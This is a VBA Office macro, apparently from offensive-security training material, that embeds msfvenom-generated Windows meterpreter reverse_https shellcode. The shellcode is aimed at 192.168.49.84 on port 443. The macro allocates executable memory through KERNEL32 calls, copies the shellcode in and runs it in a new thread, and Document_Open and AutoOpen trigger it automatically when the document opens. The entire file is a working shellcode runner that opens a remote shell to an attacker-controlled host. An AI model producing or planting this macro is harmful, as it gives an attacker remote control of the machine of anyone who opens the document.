' declare arguments for CreateThread, VirtualAlloc, and RtlMoveMemory
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    ' msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.84 LPORT=443 EXITFUNC=thread -f vbapplication
    buf = Array(232, 143, 0, 0, 0, 96, 49, 210, 137, 229, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 49, 255, 15, 183, 74, 38, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 88, 32, 139, 72, 24, 80, 1, 211, 133, 201, 116, 60, 73, 49, _
255, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, _
104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, 83, 232, 62, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, 55, 46, 48, 59, 32, 114, 118, 58, 49, 49, 46, 48, 41, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, _
0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, 83, 104, 187, 1, 0, 0, 232, 56, 1, 0, 0, 47, 67, 103, 106, 65, 55, 82, 74, 102, 79, 100, 110, 86, 66, 116, 81, 72, 116, 86, 109, 104, 116, 81, 81, 100, 75, 50, 56, 122, 78, 67, 56, 89, 81, 95, 79, 85, 51, 75, 110, 56, 55, 48, 111, 72, 67, 76, 77, 97, 68, 65, 85, 89, 100, 111, 49, _
111, 73, 69, 79, 57, 102, 106, 84, 66, 90, 122, 45, 57, 73, 52, 75, 85, 108, 68, 66, 81, 108, 104, 85, 102, 68, 99, 76, 108, 77, 86, 79, 88, 116, 122, 89, 72, 113, 95, 87, 105, 77, 97, 108, 115, 89, 54, 80, 121, 108, 95, 79, 49, 81, 77, 101, 54, 118, 86, 103, 67, 102, 108, 65, 51, 73, 57, 100, 85, 111, 78, 105, 103, 107, 89, 50, 48, 119, 50, 111, _
100, 80, 110, 90, 121, 81, 121, 79, 73, 113, 55, 81, 100, 116, 90, 113, 110, 51, 45, 75, 117, 121, 114, 67, 79, 75, 103, 75, 109, 89, 98, 106, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, 83, 104, 0, 50, 232, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 104, 128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, _
117, 70, 158, 134, 255, 213, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, 240, 53, 224, 255, 213, 79, 117, 205, 232, 74, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, _
255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 107, 255, 255, 255, 49, 57, 50, 46, 49, 54, 56, 46, 52, 57, 46, 56, 52, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
    
    ' Leave memory location to API, set allocation to buf size, MEM_COMMIT and MEM_RESERVE, RWX
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' Loop through buf Array and copy each byte into allocated memory
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' Specify start address for code execution in new thread
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub